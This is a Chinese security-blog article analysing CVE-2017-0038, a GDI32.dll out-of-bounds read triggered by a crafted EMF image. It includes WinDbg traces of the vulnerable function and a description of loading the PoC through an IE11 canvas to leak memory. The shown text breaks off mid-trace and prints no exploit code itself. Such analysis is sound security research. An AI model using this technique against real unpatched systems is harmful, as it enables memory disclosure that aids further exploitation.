<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【漏洞分析】CVE-2017-0038：GDI32越界读漏洞从分析到Exploit - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="CVE-2017-0038,GDI32越界读漏洞,二进制安全"/>
    
        <meta name="description" content="本文主要讲了对CVE-2017-0038 GDI32.dll的Out-of-bound Read漏洞分析，并使用JS编写了一个浏览器可用的exploit，随后又介绍了为什么无法用浏览器进行Info leak，然后，又用C语言完成exploit，一起来看看真正泄露的内存内容，最后将两种不同语言编写的exp分享到Github上。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【漏洞分析】CVE-2017-0038：GDI32越界读漏洞从分析到Exploit</h2>
                <div class="article-msg">
                    <span class="time">2017-03-23 10:11:44</span>
                    
                                        <span class="read">阅读：15539次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3644"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3644" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=1353169030" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01acaeca3752f24139.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=1353169030" style="color:#848e99;">k0shl</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p2.qhimg.com/t019c3b4ed79710ac08.jpg" title="t01728de3df72a48a86.jpg" alt="http://p3.qhimg.com/t01728de3df72a48a86.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=1353169030" target="_blank" textvalue="k0shl" style="text-decoration: none;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; color: rgb(0, 112, 192); font-weight: 900;">k0shl</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">稿费：600RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">前段时间我在博客发了一篇关于CVE-2017-0037 Type Confusion的文章，其中完成了在关闭DEP情况下的Exploit，当时提到做这个漏洞的时候，感觉由于利用面的限制，导致似乎无法绕过ASLR，也就是DEP也不好绕过。当时完成那篇文章后，我恰巧看到了Google Project Zero公开的另一个漏洞CVE-2017-0038，这是一个EMF文件格式导致的Out-of-bound read，众所周知，在漏洞利用中，越界读这种漏洞类型很容易能够造成信息泄露。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">换句话说，当时我考虑也许可以通过这个EMF的Out-of-bound Read造成信息泄露，然后获取某个内存基址，从而在CVE-2017-0037漏洞利用中构造ROP链来完成最后的利用（但事实证明好像还是不行2333）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">关于这个漏洞曝光之后，有人利用0patch对这个漏洞进行了修补。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PJ0关于CVE-2017-0038漏洞说明地址（含PoC EMF）：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=992" _src="https://bugs.chromium.org/p/project-zero/issues/detail?id=992">https://bugs.chromium.org/p/project-zero/issues/detail?id=992</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0patch修补CVE-2017-0038原文地址：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://0patch.blogspot.jp/2017/02/0patching-0-day-windows-gdi32dll-memory.html" _src="https://0patch.blogspot.jp/2017/02/0patching-0-day-windows-gdi32dll-memory.html">https://0patch.blogspot.jp/2017/02/0patching-0-day-windows-gdi32dll-memory.html</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">安全客翻译地址：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="http://bobao.360.cn/learning/detail/3578.html" _src="http://bobao.360.cn/learning/detail/3578.html">http://bobao.360.cn/learning/detail/3578.html</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在这篇文章中，我将首先对CVE-2017-0038这个GDI32.dll的Out-of-bound Read漏洞进行分析；随后，我将首先将分享用JS编写一个浏览器可用的Exploit，随后我将和大家一起来看一下这么做的一个限制（为什么无法用浏览器进行Info leak），也是在0patch文章中提到的0xFF3333FF到底是怎么回事；然后，我将和大家分享用C语言完成Exploit，一起来看看真正泄露的内存内容；最后我将把JS和C的Exploit放在github上和大家分享。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">调试环境是：</span></p><pre class="brush:plain;toolbar:false">Windows&nbsp;10&nbsp;x86_64&nbsp;build&nbsp;10240</pre><pre class="brush:plain;toolbar:false">IE&nbsp;11</pre><pre class="brush:plain;toolbar:false">GDI32.dll&nbsp;Version&nbsp;10.0.10240.16384</pre><p style="text-align:center"><img src="http://p9.qhimg.com/t01c92d01b2f1f6af92.png" title="t014607b4e06356eaea.png" alt="http://p6.qhimg.com/t014607b4e06356eaea.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">请大家多多交流，感谢阅读！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">CVE-2017-0038 PoC与漏洞分析</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如我在第一章分享的测试环境的图片，同样在0patch的文章中也能看到，在浏览器每次加载poc.emf的时候，都会产生不同的图片，这张图片只有左下角的一个小红点是固定不变的，其实除了左下角四个字节，其他的内容都是泄露的内存，这点在后面的分析中我们可以获得。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">那么现在我们需要解决的一个问题就是如何加载这个图片，这样我们需要用JS的画布功能来完成对PoC的构造，并且成功加载PoC.emf。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先，我们定义一个canvas画布，之后通过js的getElementById来获得画布对象，之后我们通过Image()函数来初始化image对象，加载poc.emf，最后，我们通过drawImage来读取poc.emf，将poc.emf打印在画布上。drawImage后两个参数是image在canvas画布上的坐标，这里我们设置为0,0。</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p2.qhimg.com/t01b2613e6063fab3aa.png" title="t01deaa2f8dc1368c11.png" alt="http://p9.qhimg.com/t01deaa2f8dc1368c11.png" style="text-align: center; white-space: normal;"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">完成构造后，我们稍微修改一下poc.emf的文件结构，然后打开IE11浏览器，通过Windbg附加进程，并且在gdi32!MRSETDIBITSTODEVICE::bPlay函数位置下断点，这个过程会在poc.emf映射在画布上时发生，允许js执行之后，Windbg命中函数入口。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:022&gt;&nbsp;x&nbsp;gdi32!MRSETDIBITSTODEVICE::bPlay
00007ff8`2a378730&nbsp;GDI32!MRSETDIBITSTODEVICE::bPlay&nbsp;=&nbsp;&lt;no&nbsp;type&nbsp;information&gt;
0:022&gt;&nbsp;bp&nbsp;gdi32!MRSETDIBITSTODEVICE::bPlay
Breakpoint&nbsp;0&nbsp;hit
GDI32!MRSETDIBITSTODEVICE::bPlay:
00007ff8`2a378730&nbsp;48895c2408&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[rsp+8],rbx&nbsp;ss:00000034`93cef6f0={GDI32!MRMETAFILE::bPlay&nbsp;(00007ff8`2a320950)}
0:027&gt;&nbsp;kb
RetAddr:ArgstoChild:&nbsp;Call&nbsp;Site
00007ff8`2a2ff592&nbsp;:&nbsp;00007ff8`2a320950&nbsp;00007ff8`2a2f8ed1&nbsp;00000000`00000008&nbsp;ffffffff`8f010c40&nbsp;:&nbsp;GDI32!MRSETDIBITSTODEVICE::bPlay//到达目标断点
00007ff8`2a2ff0a8&nbsp;:&nbsp;0000002c`8f00be8c&nbsp;00000000`00000000&nbsp;00000000`00000000&nbsp;00000000`00000000&nbsp;:&nbsp;GDI32!PlayEnhMetaFileRecord+0xa2
00007ff8`2a327106&nbsp;:&nbsp;00000034`92acee00&nbsp;00007ff8`2a2ff8f3&nbsp;00000034`90380680&nbsp;00000034`93cef988&nbsp;:&nbsp;GDI32!bInternalPlayEMF+0x858
00007ff8`08650a70&nbsp;:&nbsp;00007ff8`08061010&nbsp;00007ff8`08061010&nbsp;00000034`93cefa10&nbsp;00000000`000000ff&nbsp;:&nbsp;GDI32!PlayEnhMetaFile+0x26//关键函数调用PlayEnhMetaFile</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">现在我们开始单步跟踪这个关键函数的执行流程，之后我放出整个函数的伪代码，相应的注释，我已经写在//后面，首先单步执行，会到达一处参数赋值，在64位系统中，参数是靠寄存器传递的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x1b:
00007ff8`2a37874b&nbsp;488bd9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rbx,rcx
0:027&gt;&nbsp;r&nbsp;rcx
rcx=0000002c8f00be8c
0:027&gt;&nbsp;dt&nbsp;vaultcli!EMRSETDIBITSTODEVICE&nbsp;0000002c8f00be8c
&nbsp;&nbsp;&nbsp;+0x000&nbsp;emr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;tagEMR
&nbsp;&nbsp;&nbsp;+0x008&nbsp;rclBounds&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_RECTL
&nbsp;&nbsp;&nbsp;+0x018&nbsp;xDest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n0
&nbsp;&nbsp;&nbsp;+0x01c&nbsp;yDest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n0
&nbsp;&nbsp;&nbsp;+0x020&nbsp;xSrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n0
&nbsp;&nbsp;&nbsp;+0x024&nbsp;ySrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n0
&nbsp;&nbsp;&nbsp;+0x028&nbsp;cxSrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n1
&nbsp;&nbsp;&nbsp;+0x02c&nbsp;cySrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0n1
&nbsp;&nbsp;&nbsp;+0x030&nbsp;offBmiSrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x4c
&nbsp;&nbsp;&nbsp;+0x034&nbsp;cbBmiSrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x28
&nbsp;&nbsp;&nbsp;+0x038&nbsp;offBitsSrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x74
&nbsp;&nbsp;&nbsp;+0x03c&nbsp;cbBitsSrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;4
&nbsp;&nbsp;&nbsp;+0x040&nbsp;iUsageSrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0
&nbsp;&nbsp;&nbsp;+0x044&nbsp;iStartScan&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0
&nbsp;&nbsp;&nbsp;+0x048&nbsp;cScans&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x10</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这里rcx传递的指针是MRSETDIBITSTODEVICE::bplay的第一个参数，这个参数是一个非常非常非常重要的结构体EMRSETDIBITSTODEVICE，正是对这个结构体中几个成员变量的控制没有进行严格的判断，从而导致了越界读漏洞的发生。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先我们来看一下EMF文件格式。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01cdafab3f0c7a7efe.png" title="t01f953a06bd0c3a2ea.png" alt="http://p1.qhimg.com/t01f953a06bd0c3a2ea.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里，我对poc.emf进行了修改，修改了cxSrc和cySrc的值，这样在最后向HDC拷贝图像的时候，就不会读取多余的内存信息，这个结构体的变量我们要记录，因为接下来在跟踪函数内部逻辑的时候，会涉及到很多关于这个结构体成员变量的偏移，关于这个结构体变量的解释，可以参照MSDN。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd162580(v=vs.85).aspx" _src="https://msdn.microsoft.com/en-us/library/windows/desktop/dd162580(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/dd162580(v=vs.85).aspx</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来我们继续单步跟踪，首先函数会命中一个叫做pvClientObjGet的函数，这个函数会根据Handle获取EMF头部section的一个标识并对标识进行判断。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:027&gt;&nbsp;p
GDI32!pvClientObjGet+0x2a:
00007ff8`2a301d5a&nbsp;488d0daf141400&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,[GDI32!aplHash&nbsp;(00007ff8`2a443210)]
0:027&gt;&nbsp;p
GDI32!pvClientObjGet+0x31:
00007ff8`2a301d61&nbsp;83e07f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,7Fh
0:027&gt;&nbsp;p
GDI32!pvClientObjGet+0x34:
00007ff8`2a301d64&nbsp;48833cc100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[rcx+rax*8],0&nbsp;ds:00007ff8`2a443218=0000003492a60080//获取特殊handle&nbsp;object
0:027&gt;&nbsp;p
GDI32!pvClientObjGet+0x39:
00007ff8`2a301d69&nbsp;488d3cc1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdi,[rcx+rax*8]
0:027&gt;&nbsp;p
GDI32!pvClientObjGet+0x70://获得当前EMF头部section标识&nbsp;&nbsp;ENHMETA_SIGNATURE
00007ff8`2a301da0&nbsp;488b4718&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax,qword&nbsp;ptr&nbsp;[rdi+18h]&nbsp;ds:00000034`92a60098=0000003492ac5280
0:026&gt;&nbsp;r&nbsp;rax
rax=00000296033d3d30
0:026&gt;&nbsp;dc&nbsp;296033d3d30&nbsp;l1
00000296`033d3d30&nbsp;&nbsp;0000464d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MF..</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可以看到，最后函数会读取一个名为MF的标识，这个标识就是EMF文件的头部。这里会识别的就是ENHMETA_SIGNATURE结构。</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01ef9c4626af35c443.png" title="t015b2f12bef923fe40.png" alt="http://p9.qhimg.com/t015b2f12bef923fe40.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">返回之后继续单步跟踪，接下来会命中bCheckRecord函数，这个函数主要负责的就是检查EMRSETDIBITSTODEVICE中成员变量的一些信息是否符合要求。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x3f:
00007ff8`2a37876f&nbsp;498bd6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx,r14
0:027&gt;&nbsp;p
GDI32!MRSETDIBITSTODEVICE::bPlay+0x42:
00007ff8`2a378772&nbsp;488bcb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,rbx
0:027&gt;&nbsp;p
